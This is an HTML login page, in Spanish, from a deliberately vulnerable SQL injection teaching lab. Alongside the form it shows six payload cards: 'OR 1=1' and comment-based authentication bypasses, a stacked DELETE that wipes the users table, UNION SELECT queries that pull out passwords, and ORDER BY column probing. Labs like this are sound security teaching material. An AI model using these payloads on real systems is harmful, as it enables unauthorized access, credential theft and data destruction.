<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Lab — Login</title>
    <meta name="description" content="Laboratorio educativo de inyección SQL — Página de login vulnerable">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect rx='20' width='100' height='100' fill='%2338bdac'/><rect x='30' y='25' rx='6' width='40' height='50' fill='none' stroke='white' stroke-width='8'/></svg>">
</head>
<body>
    <!-- Header -->
    <header class="header">
        <a href="login.php" class="header-brand">
            <span class="logo-icon"></span>
            <h1>SQL Injection Lab</h1>
        </a>
        <nav class="header-nav">
            <a href="login.php" class="nav-link active">Login</a>
            <a href="admin.php" class="nav-link">Admin Panel</a>
        </nav>
    </header>

    <main class="main-container">
        <!-- Disclaimer -->
        <div class="disclaimer-banner">
            Entorno educativo — Aplicación intencionalmente vulnerable, solo para uso didáctico en entornos aislados.
        </div>

        <div class="page-title">
            <h2>Simulación de Login</h2>
            <p>Ingresa credenciales o utiliza las tarjetas de la derecha para probar diferentes técnicas de inyección SQL</p>
        </div>

        <div class="login-layout">
            <!-- Left Column: Login Form -->
            <div class="glass-card login-form-card">
                <div class="form-icon"></div>
                <h3>Iniciar Sesión</h3>
                <p class="form-subtitle">Sistema de autenticación vulnerable</p>

                <form id="loginForm" autocomplete="off">
                    <div class="form-group">
                        <label for="usuario">Nombre de Usuario</label>
                        <input type="text" id="usuario" name="usuario" class="form-input" placeholder="Escribe el usuario..." autocomplete="off">
                    </div>
                    <div class="form-group">
                        <label for="contrasena">Contraseña</label>
                        <input type="text" id="contrasena" name="contrasena" class="form-input" placeholder="Escribe la contraseña..." autocomplete="off">
                    </div>
                    <button type="submit" class="btn btn-primary btn-block btn-lg" id="loginBtn">
                        Iniciar Sesión
                    </button>
                </form>

                <!-- Result Panel -->
                <div id="resultPanel" class="result-panel">
                    <div class="result-header" id="resultHeader"></div>
                    <div class="result-message" id="resultMessage"></div>
                    <div class="result-query">
                        <div class="query-label">Consulta SQL ejecutada:</div>
                        <code id="resultQuery"></code>
                    </div>
                </div>
            </div>

            <!-- Right Column: Payload Cards -->
            <div class="payloads-column">
                <span class="section-label">Payloads de Inyección SQL</span>

                <!-- Payload 1: Bypass por contraseña -->
                <div class="payload-card type-bypass" data-target="contrasena" data-payload="' OR 1=1 #">
                    <div class="payload-header">
                        <span class="payload-title">Bypass por Contraseña</span>
                        <span class="payload-target target-pass">Contraseña</span>
                    </div>
                    <div class="payload-desc">Inyecta una condición siempre verdadera (1=1) para evadir la autenticación sin conocer la contraseña real. El <code>#</code> comenta el resto de la consulta.</div>
                    <div class="payload-code">' OR 1=1 #</div>
                </div>

                <!-- Payload 2: Bypass por usuario -->
                <div class="payload-card type-bypass" data-target="usuario" data-payload="admin' #">
                    <div class="payload-header">
                        <span class="payload-title">Bypass por Usuario</span>
                        <span class="payload-target target-user">Usuario</span>
                    </div>
                    <div class="payload-desc">Cierra las comillas del usuario y comenta la verificación de contraseña con <code>#</code>, omitiendo la validación por completo.</div>
                    <div class="payload-code">admin' #</div>
                </div>

                <!-- Payload 3: DELETE destructivo -->
                <div class="payload-card type-destructive" data-target="usuario" data-payload="'; DELETE FROM usuarios; #">
                    <div class="payload-header">
                        <span class="payload-title">Borrar Todos los Usuarios</span>
                        <span class="payload-target target-user">Usuario</span>
                    </div>
                    <div class="payload-desc">Ejecuta una segunda consulta destructiva usando <code>;</code> para borrar toda la tabla de usuarios.</div>
                    <div class="payload-code">'; DELETE FROM usuarios; #</div>
                </div>

                <!-- Payload 4: UNION extract password -->
                <div class="payload-card type-extract" data-target="usuario" data-payload="' UNION SELECT 1, contrasena, 3, 4 FROM usuarios WHERE usuario='admin' #">
                    <div class="payload-header">
                        <span class="payload-title">Extraer Contraseña (UNION)</span>
                        <span class="payload-target target-user">Usuario</span>
                    </div>
                    <div class="payload-desc">Usa UNION SELECT para filtrar la contraseña del admin como si fuera el nombre de usuario en el mensaje de bienvenida.</div>
                    <div class="payload-code">' UNION SELECT 1, contrasena, 3, 4 FROM usuarios WHERE usuario='admin' #</div>
                </div>

                <!-- Payload 5: UNION list all users -->
                <div class="payload-card type-extract" data-target="usuario" data-payload="' UNION SELECT id, usuario, contrasena, 4 FROM usuarios #">
                    <div class="payload-header">
                        <span class="payload-title">Listar Todos los Usuarios</span>
                        <span class="payload-target target-user">Usuario</span>
                    </div>
                    <div class="payload-desc">Devuelve todos los registros de la tabla usando UNION. Cada usuario aparecerá como un resultado del login.</div>
                    <div class="payload-code">' UNION SELECT id, usuario, contrasena, 4 FROM usuarios #</div>
                </div>

                <!-- Payload 6: ORDER BY recon -->
                <div class="payload-card type-recon" data-target="usuario" data-payload="' ORDER BY 4 #">
                    <div class="payload-header">
                        <span class="payload-title">Descubrir Columnas</span>
                        <span class="payload-target target-user">Usuario</span>
                    </div>
                    <div class="payload-desc">Técnica de reconocimiento: usa ORDER BY para determinar cuántas columnas tiene la consulta original.</div>
                    <div class="payload-code">' ORDER BY 4 #</div>
                </div>
            </div>
        </div>
    </main>

    <div class="toast-container" id="toastContainer"></div>

    <script src="js/login.js"></script>
</body>
</html>
